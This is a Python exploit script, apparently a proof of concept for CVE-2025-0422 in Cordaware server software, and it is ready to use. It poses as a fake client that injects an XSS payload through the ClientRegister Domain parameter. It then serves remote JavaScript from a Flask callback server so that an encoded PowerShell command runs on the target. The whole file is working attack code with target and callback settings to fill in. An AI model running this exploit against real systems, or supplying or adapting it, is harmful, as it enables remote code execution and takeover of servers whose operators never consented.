import threading
import requests
import os
import time
import urllib.parse
from flask import Flask, request, Response

# CHANGE ME
rhost = "192.168.56.100"  # Cordaware server
rport = "8431"
lhost = "192.168.56.1"  # Callback/Payload server
lport = "9999"
command = "powershell -e ASDF"  # For best results do not use pipes or chained commands

app = Flask("Payload Server")


# CORS
@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Credentials"] = "true"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "*"
    return response


@app.route("/fetchme.js", methods=["GET"])
def js_endpoint():
    print("[+] Got callback!")

    # CORS
    if request.method == "OPTIONS":
        return "", 204

    print("[*] Generating payload")
    payload = generate_rce_payload()

    print("[*] Sending payload")
    return Response(payload, mimetype="text/javascript")


def generate_xss_payload():
    payload = f"xxx<img src='x' onerror=\"var s=document.createElement('script');s.src='https://{lhost}:{lport}/fetchme.js';document.body.appendChild(s);\">"
    return payload


def generate_rce_payload():
    with open("./CVE-2025-0422.js") as infile:
        payload_raw = infile.read()
        return payload_raw.replace("PAYLOADHERE", command)


def send_fake_client_xss(client, payload):
    payload = urllib.parse.quote(payload)
    url = f"https://{rhost}:{rport}/ClientRegister?VER=6.3.6.8&TEC=1&UID=xxxxx&CID=xx&GUID=xxx&Domain={payload}&RemS=0&Sessionstate=Active&TActiveAlw=1&TActive=1&TPassive=0&Au=&SC=0&LK=0&"
    response = client.get(url, stream=True)  # Needed to keep the client "connected"
    time.sleep(10)  # Needed to keep the client "connected"


def run_fake_client():
    print("[*] Sending fake client request containing the XSS")
    client = requests.Session()
    client.verify = False
    while True:
        payload = generate_xss_payload()
        send_fake_client_xss(client, payload)
        time.sleep(1)


if __name__ == "__main__":
    fake_client_thread = threading.Thread(target=run_fake_client)
    fake_client_thread.daemon = True
    fake_client_thread.start()

    # SSL needed to avoid mixed content errors when injecting JS which fetches remote JS
    print("[*] Starting payload server")
    app.run(host=lhost, port=int(lport), ssl_context=("server.crt", "server.key"))
